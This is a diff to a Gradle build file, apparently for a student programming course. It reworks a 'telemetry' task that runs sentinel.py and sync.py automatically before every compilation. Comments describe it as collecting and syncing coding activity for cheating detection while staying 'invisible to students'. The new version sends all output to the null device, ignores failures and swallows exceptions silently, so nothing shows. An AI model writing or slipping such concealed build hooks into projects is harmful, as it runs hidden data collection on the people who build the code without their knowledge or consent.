@@ -16,26 +16,44 @@ dependencies {
 // Task to run telemetry scripts
 // Note: This task collects and syncs coding activity data for cheating detection.
 // It runs automatically before each compilation and remains invisible to students.
-task telemetry(type: Exec) {
+task telemetry {
     description = 'Runs sentinel.py and sync.py for telemetry collection'
     
-    // Determine Python executable and null device based on OS
-    def pythonCmd = System.getProperty('os.name').toLowerCase().contains('windows') ? 'python' : 'python3'
-    def nullDevice = System.getProperty('os.name').toLowerCase().contains('windows') ? 'NUL' : '/dev/null'
-    
-    // Run sentinel.py first, then sync.py
-    // Redirect all output to null device for stealth operation
-    commandLine 'sh', '-c', """
-        ${pythonCmd} ${project.projectDir}/sentinel.py > ${nullDevice} 2>&1 && \
-        ${pythonCmd} ${project.projectDir}/sync.py > ${nullDevice} 2>&1
-    """
-    
-    // Don't fail the build if telemetry fails
-    ignoreExitValue = true
-    
-    // Suppress standard output and error
-    standardOutput = new ByteArrayOutputStream()
-    errorOutput = new ByteArrayOutputStream()
+    doLast {
+        // Determine Python executable based on OS
+        def pythonCmd = System.getProperty('os.name').toLowerCase().contains('windows') ? 'python' : 'python3'
+        def isWindows = System.getProperty('os.name').toLowerCase().contains('windows')
+        
+        try {
+            // Run sentinel.py
+            if (isWindows) {
+                exec {
+                    commandLine 'cmd', '/c', "${pythonCmd} ${project.projectDir}/sentinel.py > NUL 2>&1"
+                    ignoreExitValue = true
+                }
+            } else {
+                exec {
+                    commandLine 'sh', '-c', "${pythonCmd} ${project.projectDir}/sentinel.py > /dev/null 2>&1"
+                    ignoreExitValue = true
+                }
+            }
+            
+            // Run sync.py
+            if (isWindows) {
+                exec {
+                    commandLine 'cmd', '/c', "${pythonCmd} ${project.projectDir}/sync.py > NUL 2>&1"
+                    ignoreExitValue = true
+                }
+            } else {
+                exec {
+                    commandLine 'sh', '-c', "${pythonCmd} ${project.projectDir}/sync.py > /dev/null 2>&1"
+                    ignoreExitValue = true
+                }
+            }
+        } catch (Exception e) {
+            // Silently ignore any errors
+        }
+    }
 }
 
 // Ensure telemetry runs during every build
